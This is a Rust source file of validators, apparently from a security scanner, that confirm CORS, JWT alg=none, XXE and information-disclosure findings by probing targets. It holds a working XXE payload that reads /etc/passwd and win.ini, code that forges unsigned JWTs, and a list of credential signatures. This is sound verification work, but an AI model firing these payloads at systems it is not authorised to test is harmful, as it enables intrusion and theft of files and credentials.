//! Generic deterministic validators: CORS misconfig, JWT alg-none,
//! XXE, info-disclosure — no AI in the loop.

use crate::finding::{Finding, FindingClass};
use crate::probe::ProbeClient;
use crate::validator::Validator;
use crate::verdict::Verdict;
use std::collections::HashMap;

fn evidence_url(f: &Finding) -> Option<String> {
    f.evidence["url"]
        .as_str()
        .or_else(|| f.evidence["request"]["url"].as_str())
        .map(String::from)
}

fn hdr(resp_headers: &[(String, String)], name: &str) -> Option<String> {
    resp_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.clone())
}

// ---------- CORS ----------

pub struct CorsValidator {
    pub probe: ProbeClient,
}

#[async_trait::async_trait]
impl Validator for CorsValidator {
    fn class(&self) -> FindingClass {
        FindingClass::Cors
    }
    async fn validate(&self, f: &Finding) -> Verdict {
        let Some(url) = evidence_url(f) else {
            return Verdict::Rejected { reason: "evidence missing url".into() };
        };
        let evil = "https://aegis-evil.example";
        let r = match self
            .probe
            .send("GET", &url, &HashMap::new(), &[("origin".into(), evil.into())], None)
            .await
        {
            Ok(r) => r,
            Err(e) => return Verdict::Rejected { reason: format!("probe failed: {e}") },
        };
        let acao = hdr(&r.headers, "access-control-allow-origin").unwrap_or_default();
        let acac = hdr(&r.headers, "access-control-allow-credentials")
            .unwrap_or_default()
            .eq_ignore_ascii_case("true");
        let reflects = acao == evil;
        let wildcard_creds = acao == "*" && acac;
        if reflects || wildcard_creds {
            return Verdict::Verified {
                reproduction: format!(
                    "GET {url} Origin:{evil} -> ACAO '{acao}'{} — hostile origin can read responses",
                    if acac { " + allow-credentials" } else { "" }
                ),
            };
        }
        Verdict::Rejected {
            reason: format!("ACAO '{acao}' does not reflect hostile origin or *+creds"),
        }
    }
}

// ---------- JWT ----------

pub struct JwtValidator {
    pub probe: ProbeClient,
}

fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    let mut v = Vec::with_capacity(s.len() * 3 / 4);
    let mut acc = 0u32;
    let mut nbits = 0;
    for c in s.chars() {
        let d = match c {
            'A'..='Z' => c as u32 - 'A' as u32,
            'a'..='z' => c as u32 - 'a' as u32 + 26,
            '0'..='9' => c as u32 - '0' as u32 + 52,
            '-' | '+' => 62,
            '_' | '/' => 63,
            '=' => break,
            _ => return None,
        };
        acc = (acc << 6) | d;
        nbits += 6;
        if nbits >= 8 {
            nbits -= 8;
            v.push((acc >> nbits) as u8);
        }
    }
    Some(v)
}

fn b64url_encode(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut out = String::new();
    for c in data.chunks(3) {
        let n = (c[0] as u32) << 16
            | (*c.get(1).unwrap_or(&0) as u32) << 8
            | *c.get(2).unwrap_or(&0) as u32;
        out.push(T[(n >> 18) as usize & 63] as char);
        out.push(T[(n >> 12) as usize & 63] as char);
        if c.len() > 1 {
            out.push(T[(n >> 6) as usize & 63] as char);
        }
        if c.len() > 2 {
            out.push(T[n as usize & 63] as char);
        }
    }
    out
}

#[async_trait::async_trait]
impl Validator for JwtValidator {
    fn class(&self) -> FindingClass {
        FindingClass::SessionJwt
    }
    async fn validate(&self, f: &Finding) -> Verdict {
        let Some(url) = evidence_url(f) else {
            return Verdict::Rejected { reason: "evidence missing url".into() };
        };
        // Find a bearer token in evidence headers.
        let headers = crate::validator::evidence_headers(f);
        let Some((hk, hv)) = headers.iter().find(|(k, v)| {
            k.eq_ignore_ascii_case("authorization") && v.to_lowercase().starts_with("bearer ")
        }) else {
            return Verdict::Rejected {
                reason: "evidence.headers needs Authorization: Bearer <jwt>".into(),
            };
        };
        let token = hv[7..].trim();
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() < 2 {
            return Verdict::Rejected { reason: "not a JWT shape".into() };
        }
        // alg=none token: same payload, header {"alg":"none"}.
        let none_tok = format!(
            "{}.{}.",
            b64url_encode(br#"{"alg":"none","typ":"JWT"}"#),
            parts[1]
        );
        let hdr_for = |t: &str| {
            let mut h = headers.clone();
            for (k, v) in h.iter_mut() {
                if k == hk {
                    *v = format!("Bearer {t}");
                }
            }
            h
        };
        // Controls: garbage signature must fail, alg-none must pass.
        let garbage = format!("{}x", token);
        let g = self
            .probe
            .send("GET", &url, &HashMap::new(), &hdr_for(&garbage), None)
            .await;
        let n = self
            .probe
            .send("GET", &url, &HashMap::new(), &hdr_for(&none_tok), None)
            .await;
        let Ok(g) = g else {
            return Verdict::Rejected { reason: "control probe failed".into() };
        };
        let Ok(n) = n else {
            return Verdict::Rejected { reason: "alg-none probe failed".into() };
        };
        let garbage_rejected = g.status >= 400;
        let none_accepted = (200..300).contains(&n.status);
        if garbage_rejected && none_accepted {
            return Verdict::Verified {
                reproduction: format!(
                    "JWT alg=none accepted ({}) while tampered token rejected ({}) — signature not verified",
                    n.status, g.status
                ),
            };
        }
        // decode sanity: warn if token wasn't even parseable
        let _ = b64url_decode(parts[1]);
        Verdict::Rejected {
            reason: format!("alg-none status {} / garbage status {} — signature likely enforced", n.status, g.status),
        }
    }
}

// ---------- XXE ----------

pub struct XxeValidator {
    pub probe: ProbeClient,
}

#[async_trait::async_trait]
impl Validator for XxeValidator {
    fn class(&self) -> FindingClass {
        FindingClass::Xxe
    }
    async fn validate(&self, f: &Finding) -> Verdict {
        let Some(url) = evidence_url(f) else {
            return Verdict::Rejected { reason: "evidence missing url".into() };
        };
        let headers = crate::validator::evidence_headers(f);
        let mut hdrs = headers;
        if !hdrs.iter().any(|(k, _)| k.eq_ignore_ascii_case("content-type")) {
            hdrs.push(("content-type".into(), "application/xml".into()));
        }
        for entity in ["file:///etc/passwd", "file:///c:/windows/win.ini"] {
            let body = format!(
                r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{entity}">]><r>&xxe;</r>"#
            );
            let r = self.probe.send("POST", &url, &HashMap::new(), &hdrs, Some(body)).await;
            if let Ok(r) = r {
                for sig in ["root:x:", "root:*:", "[boot loader]", "[extensions]"] {
                    if r.body.contains(sig) {
                        return Verdict::Verified {
                            reproduction: format!(
                                "POST {url} XXE entity {entity} -> file signature '{sig}' in response"
                            ),
                        };
                    }
                }
            }
        }
        Verdict::Rejected { reason: "no entity expansion observed".into() }
    }
}

// ---------- Info disclosure ----------

pub struct InfoDisclosureValidator {
    pub probe: ProbeClient,
}

const SECRET_SIGS: &[&str] = &[
    "-----BEGIN", "AKIA", "flag{", "xpl_", "sk-", "ghp_", "PRIVATE KEY",
    "DB_PASSWORD", "SECRET_KEY", "api_key\"", "apiKey\":", "password\"",
    "passwd", "BEGIN RSA", "BEGIN OPENSSH",
];

#[async_trait::async_trait]
impl Validator for InfoDisclosureValidator {
    fn class(&self) -> FindingClass {
        FindingClass::InfoDisclosure
    }
    async fn validate(&self, f: &Finding) -> Verdict {
        let Some(url) = evidence_url(f) else {
            return Verdict::Rejected { reason: "evidence missing url".into() };
        };
        let headers = crate::validator::evidence_headers(f);
        let r = self.probe.send("GET", &url, &HashMap::new(), &headers, None).await;
        let Ok(r) = r else {
            return Verdict::Rejected { reason: "probe failed".into() };
        };
        if !(200..300).contains(&r.status) || r.body.len() < 20 {
            return Verdict::Rejected {
                reason: format!("status {} / body too small", r.status),
            };
        }
        // If evidence supplies a marker (e.g. a secret the solver saw),
        // require it in the replayed response.
        if let Some(m) = f
            .evidence["expect"]
            .as_str()
            .or_else(|| f.evidence["marker"].as_str())
        {
            if m.len() >= 4 && r.body.contains(m) {
                return Verdict::Verified {
                    reproduction: format!("GET {url} -> sensitive marker '{m}' present (status {})", r.status),
                };
            }
        }
        if let Some(sig) = SECRET_SIGS.iter().find(|s| r.body.contains(**s)) {
            return Verdict::Verified {
                reproduction: format!("GET {url} -> secret signature '{sig}' exposed (status {})", r.status),
            };
        }
        Verdict::Rejected { reason: "no secret signature in response".into() }
    }
}
